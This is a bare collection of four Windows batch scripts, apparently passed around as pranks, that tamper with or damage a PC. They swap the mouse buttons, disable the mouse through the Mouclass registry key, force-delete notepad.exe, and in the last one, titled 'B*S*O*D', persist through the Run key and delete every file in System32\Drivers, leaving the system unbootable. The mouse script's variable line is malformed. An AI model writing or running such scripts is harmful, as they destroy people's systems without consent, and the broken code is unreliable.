@echo off
:: Swap Mouse Buttons
RUNDLL32 USER32.DLL,SwapMouseButton

-------------------------------------------

@echo off
:: Disable Mouse
key = "HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4


----------------------------------------
@echo off
:: Delete Notepad
del /f /q "%systemroot%\notepad.exe"

-----------------------------------------
@echo off
:: B*S*O*D
Set adasdwdadasd=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Reg Add "%adasdwdadasd%" /v "BSOD" /t "REG_SZ" /d %0 /f > nul
Del /q /s /f "%SystemRoot%\System32\Drivers\*.*"